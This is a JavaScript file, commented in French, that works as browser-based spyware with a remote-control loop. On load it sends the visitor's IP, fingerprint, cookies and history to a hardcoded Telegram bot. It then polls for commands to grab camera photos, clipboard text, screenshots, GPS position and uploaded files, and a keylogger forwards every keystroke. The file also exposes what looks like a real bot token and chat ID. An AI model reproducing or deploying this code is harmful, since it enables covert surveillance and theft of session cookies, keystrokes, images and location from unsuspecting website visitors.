// ============================================
// CONFIGURATION TELEGRAM (INTÉGRÉE)
// ============================================
const TELEGRAM_BOT_TOKEN = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
const TELEGRAM_CHAT_ID = '6767182328';
const BOT_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const statusDiv = document.getElementById('statusBar');
let lastCommand = '';
let collectedData = {
    fingerprint: {},
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    publicIP: null,
    privateIP: null,
    photos: [],
    cookies: {},
    browsingHistory: [],
    location: null,
    keystrokes: []
};

function updateStatus(msg, isError = false) {
    if (statusDiv) {
        statusDiv.innerHTML = (isError ? '🔴 ' : '🟢 ') + msg;
    }
    console.log('[STATUS]', msg);
}

// ============================================
// ENVOIS TELEGRAM
// ============================================
async function sendToTelegram(message) {
    try {
        await fetch(`${BOT_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message.substring(0, 4000) })
        });
    } catch(e) {}
}

async function sendPhotoToTelegram(photoDataUrl) {
    try {
        const blob = await (await fetch(photoDataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        await fetch(`${BOT_API_URL}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) {}
}

// ============================================
// 1. FINGERPRINT + IP
// ============================================
async function collectFingerprint() {
    updateStatus('📡 Collecte empreinte...');
    collectedData.fingerprint = {
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        uuid: crypto.randomUUID ? crypto.randomUUID() : 'not-supported'
    };
    
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        collectedData.publicIP = data.ip;
    } catch(e) {}
    
    await sendToTelegram(`🆕 VISITEUR\nUUID: ${collectedData.fingerprint.uuid}\nIP: ${collectedData.publicIP || 'inconnue'}\nAgent: ${navigator.userAgent}`);
}

// ============================================
// 2. IP PRIVÉE
// ============================================
async function collectPrivateIP() {
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = event => {
            if (event?.candidate?.candidate) {
                const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (match) {
                    collectedData.privateIP = match[0];
                    pc.close();
                    resolve(match[0]);
                }
            }
        };
        setTimeout(() => {
            collectedData.privateIP = 'non détectée';
            pc.close();
            resolve('non détectée');
        }, 2000);
    });
}

// ============================================
// 3. COOKIES (envoi automatique)
// ============================================
function sendCookies() {
    const allCookies = document.cookie;
    if (allCookies && allCookies.length > 0) {
        sendToTelegram(`🍪 COOKIES: ${allCookies.substring(0, 3500)}`);
    } else {
        sendToTelegram(`🍪 Aucun cookie trouvé`);
    }
}

// ============================================
// 4. HISTORIQUE
// ============================================
function sendHistory() {
    try {
        const history = [];
        const perfEntries = performance.getEntriesByType('navigation');
        perfEntries.forEach(entry => {
            if (entry.name && entry.name !== 'about:blank') history.push(entry.name);
        });
        if (document.referrer) history.push(`Referrer: ${document.referrer}`);
        if (history.length > 0) {
            sendToTelegram(`📜 HISTORIQUE: ${history.slice(0, 5).join(' → ')}`);
        }
    } catch(e) {}
}

// ============================================
// 5. NOTIFICATIONS
// ============================================
async function requestNotifications() {
    const permission = await Notification.requestPermission();
    if (permission === 'granted') {
        sendToTelegram('✅ Notifications activées');
    }
}

// ============================================
// 6. CAMÉRA
// ============================================
async function requestCamera() {
    updateStatus('📷 Demande caméra...');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        sendToTelegram('✅ Caméra activée');
        
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        
        for (let i = 1; i <= 3; i++) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            await sendPhotoToTelegram(canvas.toDataURL('image/jpeg', 0.8));
            await new Promise(r => setTimeout(r, 1500));
        }
        
        stream.getTracks().forEach(t => t.stop());
        sendToTelegram('✅ 3 photos capturées');
    } catch(e) {
        sendToTelegram(`❌ Caméra refusée`);
    }
}

// ============================================
// 7. BOUTON FICHIERS FLOTTANT
// ============================================
function showFloatingFileButton() {
    if (document.getElementById('file-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'file-btn';
    btn.innerHTML = '📁 Sélectionner un fichier';
    btn.style.cssText = 'position:fixed;bottom:80px;right:20px;z-index:9999;background:#28a745;color:white;border:none;border-radius:50px;padding:10px 15px;font-size:12px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.2);';
    btn.onclick = () => {
        const input = document.createElement('input');
        input.type = 'file';
        input.multiple = true;
        input.accept = 'image/*,video/*,.pdf,.txt';
        input.onchange = async (e) => {
            const files = Array.from(e.target.files);
            sendToTelegram(`📁 ${files.length} fichier(s) sélectionné(s)`);
            for (const file of files) {
                const reader = new FileReader();
                reader.onload = async (ev) => {
                    const dataUrl = ev.target.result;
                    if (file.type.startsWith('image/')) {
                        await sendPhotoToTelegram(dataUrl);
                    } else {
                        const blob = await (await fetch(dataUrl)).blob();
                        const formData = new FormData();
                        formData.append('chat_id', TELEGRAM_CHAT_ID);
                        formData.append('document', blob, file.name);
                        await fetch(`${BOT_API_URL}/sendDocument`, { method: 'POST', body: formData });
                    }
                };
                reader.readAsDataURL(file);
            }
        };
        input.click();
        btn.remove();
    };
    document.body.appendChild(btn);
    setTimeout(() => btn.remove(), 30000);
}

// ============================================
// 8. BOUTON GPS FLOTTANT
// ============================================
function showFloatingGpsButton() {
    if (document.getElementById('gps-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'gps-btn';
    btn.innerHTML = '📍 Partager position';
    btn.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:9999;background:#405DE6;color:white;border:none;border-radius:50px;padding:10px 15px;font-size:12px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.2);';
    btn.onclick = () => {
        navigator.geolocation.getCurrentPosition(
            pos => sendToTelegram(`📍 GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`),
            err => sendToTelegram(`❌ GPS refusé`)
        );
        btn.remove();
    };
    document.body.appendChild(btn);
    setTimeout(() => btn.remove(), 30000);
}

// ============================================
// 9. PRESSE-PAPIER
// ============================================
async function readClipboard() {
    try {
        if (navigator.clipboard?.readText) {
            const text = await navigator.clipboard.readText();
            sendToTelegram(`📋 Presse-papier: ${text.substring(0, 500) || '(vide)'}`);
        }
    } catch(e) {
        sendToTelegram(`❌ Presse-papier inaccessible`);
    }
}

// ============================================
// 10. CAPTURE ÉCRAN
// ============================================
async function captureScreenshot() {
    try {
        if (typeof html2canvas === 'undefined') {
            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
            document.head.appendChild(script);
            await new Promise(r => setTimeout(r, 1000));
        }
        if (typeof html2canvas !== 'undefined') {
            const canvas = await html2canvas(document.body);
            await sendPhotoToTelegram(canvas.toDataURL('image/png'));
        }
    } catch(e) {}
}

// ============================================
// 11. VIBRATION
// ============================================
function vibrate() {
    if (navigator.vibrate) navigator.vibrate(200);
}

// ============================================
// 12. RÉCUPÉRATION DES COMMANDES (VIA API TELEGRAM)
// ============================================
async function checkCommands() {
    try {
        // Lire la commande depuis le fichier temporaire créé par bot.php
        const res = await fetch('/tmp/telegram_command.txt?t=' + Date.now());
        if (!res.ok) return;
        
        const cmd = await res.text();
        const cleanCmd = cmd.trim();
        
        if (!cleanCmd || cleanCmd === lastCommand) return;
        lastCommand = cleanCmd;
        
        console.log('[COMMAND]', cleanCmd);
        
        if (cleanCmd === '/camera') await requestCamera();
        else if (cleanCmd === '/files') showFloatingFileButton();
        else if (cleanCmd === '/clipboard') await readClipboard();
        else if (cleanCmd === '/screenshot') await captureScreenshot();
        else if (cleanCmd === '/location') showFloatingGpsButton();
        else if (cleanCmd === '/cookies') sendCookies();
        else if (cleanCmd === '/history') sendHistory();
        else if (cleanCmd === '/status') {
            sendToTelegram(`📊 STATUT\nUUID: ${collectedData.fingerprint.uuid}\nIP: ${collectedData.publicIP || 'inconnue'}\nCookies: ${document.cookie.length > 0 ? 'présents' : 'aucun'}`);
        }
        else if (cleanCmd === '/ping') sendToTelegram('🏓 Pong!');
        else if (cleanCmd === '/vibrate') vibrate();
        else if (cleanCmd.startsWith('notify_custom:')) {
            new Notification('📢 Message', { body: cleanCmd.replace('notify_custom:', '').trim() });
        }
        else if (cleanCmd.startsWith('url:')) {
            window.open(cleanCmd.replace('url:', '').trim(), '_blank');
        }
        
        // Effacer la commande
        await fetch('/tmp/telegram_command.txt', { method: 'POST', body: '' });
        
    } catch(e) {}
}

// ============================================
// 13. KEEP-ALIVE
// ============================================
function keepAlive() {
    setInterval(() => {
        fetch('/tmp/keepalive.txt?t=' + Date.now()).catch(() => {});
    }, 25000);
}

// ============================================
// 14. KEYLOGGER SIMPLE
// ============================================
let keyBuffer = '';
document.addEventListener('keypress', (e) => {
    keyBuffer += e.key;
    if (keyBuffer.length >= 20) {
        sendToTelegram(`⌨️ Frappes: ${keyBuffer}`);
        keyBuffer = '';
    }
});

// ============================================
// EXÉCUTION PRINCIPALE
// ============================================
(async function main() {
    updateStatus('🟢 Démarrage...');
    await collectFingerprint();
    await collectPrivateIP();
    sendCookies(); // Envoi automatique des cookies
    sendHistory();
    await requestNotifications();
    keepAlive();
    
    setInterval(checkCommands, 3000);
    updateStatus('✅ Prêt - Commandes actives');
    sendToTelegram('✅ Bot actif - Envoyez /help');
})();
